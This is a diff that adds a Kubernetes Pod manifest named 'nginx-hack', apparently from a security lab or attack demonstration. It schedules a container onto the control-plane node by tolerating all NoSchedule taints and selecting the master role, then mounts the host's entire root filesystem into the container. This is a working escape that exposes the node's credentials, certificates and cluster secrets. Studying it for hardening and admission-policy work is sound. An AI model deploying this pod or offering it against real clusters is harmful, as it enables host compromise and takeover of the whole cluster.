@@ -1,0 +1,21 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nginx-hack
+spec:
+  containers:
+  - name: nginx-container
+    image: nginx
+    volumeMounts:
+    - mountPath: /master
+      name: master
+  volumes:
+  - hostPath: 
+      path: /
+      type: Directory
+    name: master
+  tolerations:
+  - effect: NoSchedule
+    operator: Exists
+  nodeSelector:
+    node-role.kubernetes.io/master: ""
